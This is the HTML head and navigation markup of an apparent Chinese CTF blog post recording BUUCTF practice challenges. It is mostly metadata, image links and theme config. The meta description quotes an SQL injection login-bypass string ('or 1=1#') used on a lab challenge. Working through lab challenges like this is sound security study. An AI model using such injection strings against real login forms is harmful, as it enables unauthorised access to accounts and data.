

<!DOCTYPE html>
<html lang="en" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">

  <link rel="apple-touch-icon" sizes="76x76" href="/img/icon.jpg">
  <link rel="icon" href="/img/icon.jpg">
  

  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="rainstar">
  <meta name="keywords" content="">
  
    <meta name="description" content="[TOC] BUUCTF 极客大挑战easysql 用户名处尝试万能密码adminxx&#39; or 1&#x3D;1# 极客大挑战Havefun 1234567&lt;!--        $cat&#x3D;$_GET[&#x27;cat&#x27;];        echo $cat;        if($cat&#x3D;&#x3D;&#x27;dog&#x27;)&#123;            echo &#x27;Syc&amp;">
<meta property="og:type" content="article">
<meta property="og:title" content="刷题记录">
<meta property="og:url" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/index.html">
<meta property="og:site_name" content="RainStar&#39;s Blog">
<meta property="og:description" content="[TOC] BUUCTF 极客大挑战easysql 用户名处尝试万能密码adminxx&#39; or 1&#x3D;1# 极客大挑战Havefun 1234567&lt;!--        $cat&#x3D;$_GET[&#x27;cat&#x27;];        echo $cat;        if($cat&#x3D;&#x3D;&#x27;dog&#x27;)&#123;            echo &#x27;Syc&amp;">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1744623921115.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1744624432314.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1744724392020.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1744795135941.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1744797037607.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1744797333070.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1744797550134.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1744797918898.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1744813020114.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1744813347803.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1744813463967.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1744813693935.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1744813767594.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1744883871408.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1744903994950.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1745033604662.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1745033808547.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1745121815285.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1745122359143.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1745122596356.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1745123182786.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1745123640875.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1745123732215.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1745124326465.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1745124381437.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1745124490071.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1745124541741.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1745124743359.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1745249460688.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1745249546150.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1745249804362.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1745249945969.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1745329914638.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1745330399238.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1745402059483.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1745414466502.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1745420832110.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1745488420160.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1745488680907.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1745489429373.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1745498554714.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1745497690754.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1745499109626.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1745500382827.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1745551946125.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1745762008976.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1745762179494.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1745762242983.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1745762814382.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1745810869975.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1745812529157.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1745832099488.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1745984386747.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1745984655517.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1745984864831.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1745985075384.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1745985468043.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1746610738341.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1746611356480.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1746611432004.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1746611466519.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1746615544101.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1746712552974.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1746712599826.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1746712664171.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1746712728746.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1746712887851.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1746713166148.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1746713281988.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1746758328743.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1746758362695.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1746758413957.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1746758473096.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1746758539083.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1746758808355.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1746758964323.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1746802838612.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1746949218055.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1746949317656.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1746949395330.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1746949631180.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1746952859680.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1746953017538.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1746952976916.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1746953164634.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1746953217617.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1746953307489.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1746953368672.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1746953512860.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1746953569239.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1746953736986.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1746954731088.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1746954751288.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1746954825149.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1746955202405.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1746955235769.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1747016942464.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1747017096265.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1747017167700.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1747017392311.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1747018305865.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1747018434495.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1747019042446.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1747019174462.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1747019333872.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1747019474304.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1747055282060.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1747055378884.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1747058486190.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1747058595848.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1747110465254.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1747111325732.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1747142220618.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1747142307166.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1747144102739.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1747144310061.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1747144619588.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1747202652632.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1747203345964.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1747315989901.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1747316032547.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1747316088811.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1747316148916.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1747316278080.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1747316820721.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1747624533252.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1747624565188.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1747710134723.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1747710384408.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1747711661627.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1747795895654.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1747796470371.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1747796574757.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1747820717011.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1747820866123.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1747820971138.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1747823292182.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1747890547729.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1747890511330.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1748242783312.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1748244268410.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1748247959561.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1748248084866.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1748248284439.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1748333496877.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1748333711823.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1748333835708.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1748337434968.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1748417145030.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1748441268819.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1748443645630.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1748443861210.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1748444466078.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1748444739932.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1748510507406.png">
<meta property="og:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1748510894476.png">
<meta property="article:published_time" content="2025-05-28T09:47:10.000Z">
<meta property="article:modified_time" content="2025-05-29T10:06:42.134Z">
<meta property="article:author" content="rainstar">
<meta property="article:tag" content="CTF">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://rain00star.github.io/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1744623921115.png">
  
  
  
  <title>刷题记录 - RainStar&#39;s Blog</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">



<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"rain00star.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":100,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":false,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"noNmr9chT20dHBom1tUWnaWV-gzGzoHsz","app_key":"al8tnZ6DMkS0VQ1cKWpSbLvr","server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  

  

  

  

  

  
    
  



  
<!-- hexo injector head_end start -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>RainStar</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>Home</span>
              </a>
            </li>
          
        
          
          
          
          
